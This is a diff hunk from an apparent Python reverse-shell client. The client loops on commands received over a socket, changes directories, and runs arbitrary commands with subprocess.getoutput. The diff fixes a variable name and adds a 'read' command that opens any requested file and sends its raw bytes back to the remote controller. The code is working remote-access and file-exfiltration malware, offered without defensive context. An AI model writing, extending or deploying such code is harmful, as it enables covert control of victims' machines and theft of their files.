@@ -17,17 +17,25 @@ s.send(cwd.encode())
 
 while True:
     command = s.recv(BUFFER_SIZE).decode()
-    splited_command = command.split()
+    splitted_command = command.split()
 
     if command.lower() == "exit":
         break
-    if splited_command[0].lower() == "cd":
+    if splitted_command[0].lower() == "cd":
         try:
-            os.chdir(' '.join(splited_command[1:]))
+            os.chdir(' '.join(splitted_command[1:]))
         except FileNotFoundError as e:
             output = str(e)
         else:
             output = ""
+    elif splitted_command[0].lower() == 'read':
+        file = splitted_command[1]
+        if os.path.exists(file) and os.path.isfile(file):
+            s.send("ok".encode())
+            with open(file, "rb") as f:
+                data = f.read()
+            s.send(data)
+            s.send("file has been downloaded".encode())
     else:
         output = subprocess.getoutput(command)
 
